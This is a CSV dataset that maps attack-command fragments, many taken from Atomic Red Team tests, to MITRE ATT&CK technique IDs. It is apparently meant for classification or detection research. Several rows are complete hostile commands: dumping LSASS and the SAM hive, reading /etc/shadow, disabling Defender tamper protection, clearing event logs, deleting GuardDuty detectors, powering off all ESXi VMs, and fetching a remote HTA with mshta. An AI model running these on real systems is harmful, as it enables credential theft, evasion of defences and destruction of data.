command,mitre_id
reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f,T1112
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""",T1137
username=$(id -u -n) && lsof -u $username,T1087
Temp\ModeAuto\icons,T1113
Import-Module .\Invoke-Phant0m.ps1,T1562
import,T1546
Get-ADComputer,T1087
$notificationPackagesValues += $passwordFilterName,T1556
/proc/<PID>/maps,T1003
"Stop-Service -Name ""$service_name"" -force -erroraction silentlycontinue | Out-Null",T1543
nbtscan,T1018
igfxem.exe,T1574
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"" -Name ""TamperProtection"" -Value 0",T1562
diskshadow.exe /s $filename,T1003
End Sub,T1137
$PathToAtomicsFolder\T1055\bin\x64\UuidFromStringA.exe -debug,T1055
"Write-Host "" [-] $username:${password} invalid credentials.`r`n""",T1110
msiexec /quiet /i {PATH:.msi},T1218
dscl . -create /Users/$username PrimaryGroupID 80,T1136
"Start-Process ""$exe_binary""",T1027
"Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"" -DestinationPath ""$env:userprofile\Downloads\T1036"" -Force",T1036
"[DllImport(""user32.dll"", CharSet=CharSet.Auto)]",T1491
schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system,T1053
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf",T1562
OneDriveStandaloneUpdater,T1105
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko,T1071
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,T1105
"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""",T1218
AppPatch,T1546
nbtstat -n,T1016
GetLocalTime(),T1106
svchosst,T1036
esxcli network firewall set,T1562
takeown /F C:\Windows\System32\AtBroker.exe /A,T1546
"Set-Location ""PathToAtomicsFolder""",T1071
"if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi",T1082
Invoke-CimMethod,T1053
GetUserDefaultLocaleName,T1614
"$env:AWS_SECRET_ACCESS_KEY = ""$awsSecretKey""",T1567
and,T1564
get-process lsass | Out-Minidump,T1003
sc start W64Time,T1543
fork(),T1036
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""$output_file"" /target:library /keyfile:$env:Temp\key.snk $source_file",T1218
wevtutil cl $log_name,T1070
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.rtf.ps1 /Y",T1036
"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit""",T1003
"(e.g.,",T1564
Set-MpPreference -dscrptsc $True,T1562
<MappedFolder>,T1564
"for /L %a in (1,1,$limit) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\$target_hive"" %temp%\$target_hivevss%a 2 >nul 2>&1) & dir /B %temp%\$target_hivevss*",T1003
System.Net.NetworkInformation.Ping,T1018
shell.txt,T1140
ilasm.exe {PATH_ABSOLUTE:.txt} /dll,T1127
ps,T1057
launchctl unload,T1569
ShowWindow,T1564
utimes(),T1070
"Add-MailboxPermission -Identity ""$delegate_target"" -User ""$operator_mailbox"" -AccessRights FullAccess -InheritanceType All",T1098
Gpscript /startup,T1218
"Get-Content -Path ""$env:TEMP\silver.txt"" -Wait | ForEach-Object {",T1558
"{cmd /c copy ""$binary_file"" ""\\$machine\$remote_drive_letter$$exe_remote_folder""",T1105
"Write-Host ""Registry key not found. Make sure the 'TermService\Parameters' key exists.""",T1505
$ReadResponse.BaseStream.Position = 0,T1619
bash $autosuid,T1059
"Write-Host ""End of bruteforce""",T1110
powershell Get-CimInstance -Namespace root/securityCenter2 – classname antivirusproduct,T1518
"reg add ""HKCU\Software\Microsoft\Office\16.0\Word\Options"" /v STARTUP-PATH /t REG_SZ /d ""C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent"" /f",T1546
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""",T1529
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));',T1140
". ""$script_path""",T1055
VkKeyScan,T1056
"Invoke-Seatbelt -Command ""-group=all""",T1082
"{echo ""Uploading $file...""",T1048
echo \'Defaults !tty_tickets\' >> /etc/sudoers,T1548
EnumWindows,T1055
Invoke-ATHCompiledHelp -HHFilePath $hh_file_path -CHMFilePath $chm_file_path,T1218
"cd ""$rclone_path""",T1567
"copy ""$service_executable"" ""C:\Program Files\windows_service.exe""",T1574
test.au3,T1059
cmd /c tasklist > %temp%\temp.ini,T1057
expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat},T1105
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")",T1218
Invoke-WmiMethod -Path $new_class -Name create -ArgumentList $process_to_execute,T1047
wuauclt.exe,T1036
Scriptrunner.exe,T1202
Duser.dll,T1574
"powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""",T1518
net accounts,T1201
./stratus warmup aws.credential-access.ec2-get-password-data,T1552
"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",T1218
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}},T1114
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD,T1547
schtasks /query,T1053
chmod +x sqlite_dump.sh,T1005
CSIDL_APPDATA\microsoft\security,T1036
/var/folder,T1074
EnumResourceW(),T1106
"Invoke-SharpUp -command ""audit""",T1082
window.location.pathname,T1480
CalendarChecker,T1053
sudo kextunload $module_path,T1547
SecKeychainItemCopyAttributesAndData,T1555
te.exe {PATH:.dll},T1127
"echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js",T1105
MS17-10 -noninteractive -consoleoutput,T1046
fsianycpu.exe {PATH:.fsscript},T1059
Win32_MotherboardDevice,T1082
/data/runtime/cockpit/wd.fd,T1559
"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\",T1547
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll},T1543
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp $optional_args",T1087
Remove-ItemProperty -Path $registryPath -Name $newValueName,T1562
"$wait.asyncwaithandle.waitone(250, $false) | Out-Null",T1016
"Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""$target_key_value_name"" -Value ""$payload""",T1547
lstrcat,T1106
HKU\SOFTWARE\Microsoft\CTF,T1012
msiexec /z {PATH_ABSOLUTE:.dll},T1218
sudo cat /etc/shadow > $output_file,T1003
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,T1547
"Cd ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs""",T1204
cscript %windir%\System32\manage-bde.wsf,T1216
sudo log -f /var/log/system.log | : > /var/log/system.log,T1070
net time,T1124
reg save HKLM\\SAM sam.hiv,T1003
C:\Windows\system32\net.exe,T1574
"copy ""$vbs_path"" %temp%\T1036.007_masquerading.xlsx.vbs /Y",T1036
killall,T1489
iscsicpl.exe,T1548
"Set-Location ""$Env:windir\System32\Tasks""",T1218
} catch {,T1083
echo $ENCODED | b64decode -r,T1140
"sh -c ""echo 'echo Hello from the Atomic Red Team' > $script_path""",T1059
rm /tmp/art_payload.sh,T1027
.dll,T1574
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v InitialProgram /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f",T1112
"msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv",T1003
HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe,T1564
echo 'import requests' > $python_script_name,T1059
sctasks,T1053
HKCU\Environment\UserInitMprLogonScript,T1037
"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;",T1497
Sdl,T1070
aws guardduty delete-detector --detector-id $detectorId,T1562
Get-ADDomain,T1482
copy,T1105
"echo ""*** Log Group Created ***""",T1562
"""$Path_to_file"" 1>NUL",T1105
kextstat 2>/dev/null | grep SoftRAID,T1547
Remove-Item $credFile,T1098
diskshadow.exe /s {PATH:.txt},T1003
get-secret-value,T1555
"$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null",T1552
cmdexe,T1059
$PathToAtomicsFolder\T1055\bin\x64\RtlCreateUserThread.exe -pid $process.Id -debug,T1055
GetUserNameW,T1106
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\,T1547
"Write-Host ""Registry value deleted: $newValueName""",T1562
AppData\Local\Temp,T1070
Write-Host $results,T1016
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},T1105
IOCTL_DISK_GET_LENGTH_INFO,T1680
libdsplibs.so,T1027
dnx.exe {PATH_ABSOLUTE:folder},T1127
/run/shm,T1027
cloud.sh,T1546
Start-Dnscat2 -Domain $domain -DNSServer $server_ip,T1071
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm,T1137
mshta http[:]//webserver/payload[.]hta,T1218
lsass.exe,T1003
$excelApp.Quit(),T1137
echo '# KEYWORD: shutdown' >> $rc_service_path/$rc_service_file,T1543
search-ms,T1105
$document.Close(),T1137
"if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=""centos""') ]; then chkconfig T1543.002 on ; else echo ""Please run this test on Ubnutu , kali OR centos"" ; fi",T1543
Microsoft.Storage/storageAccounts/delete,T1490
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null,T1204
dscl . -list /Groups,T1069
"Add-Content $ps_profile -Value """"",T1546
&lt;executable&gt;,T1546
"wmic /node: ""$machine"" process call create ""regsvr32.exe /i $remote_drive_letter:$exe_remote_folder""}",T1105
wevtutil,T1070
"& ""PathToAtomicsFolder\T1090.003\src\Psiphon.bat""",T1090
reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v,T1564
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f",T1546
"Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\logins.json"" -Destination $profile\ > $null",T1555
"New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force",T1548
